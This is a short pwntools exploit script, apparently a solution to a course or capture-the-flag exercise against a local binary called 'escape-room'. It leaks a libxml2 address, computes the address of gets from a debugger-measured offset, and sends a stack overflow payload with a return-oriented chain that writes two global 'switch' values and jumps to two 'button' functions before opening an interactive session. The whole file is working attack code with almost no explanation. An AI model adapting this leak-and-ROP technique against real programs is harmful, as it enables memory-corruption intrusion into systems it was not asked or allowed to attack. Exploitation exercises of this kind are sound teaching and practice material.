from pwn import *

target='./escape-room'
p=process(target)
io=p

switch1_addr=0x08052000
switch2_addr=0x08052004

button1_addr=0x08049276
button2_addr=0x08049311

# pop ret 
gadget=0x08049022

io.recv()
print(io.recv())
io.sendline("5")

print(io.recvuntil("libxml2.so.2\nRange: "))
msg=str(io.recv())
msg=msg[2:28]
msg=msg.split("->")[0]
lib_addr=int(msg, 16)

"""
In gdb, 
library: 0xf7df1000 (libxml2.so.2)
gets: 0xf7b530c0
"""

addrdif=0xf7df1000-0xf7b530c0
get_addr=lib_addr-addrdif

io.sendline("6")

payload=b'\x90' * 28
payload+=p32(get_addr)+p32(gadget)+p32(switch1_addr)
payload+=p32(get_addr)+p32(gadget)+p32(switch2_addr)
payload+=p32(button1_addr)+p32(button2_addr)

io.sendline(payload)
io.sendline(p32(0xdeadbeef))
io.sendline("SWE3025")

io.interactive()
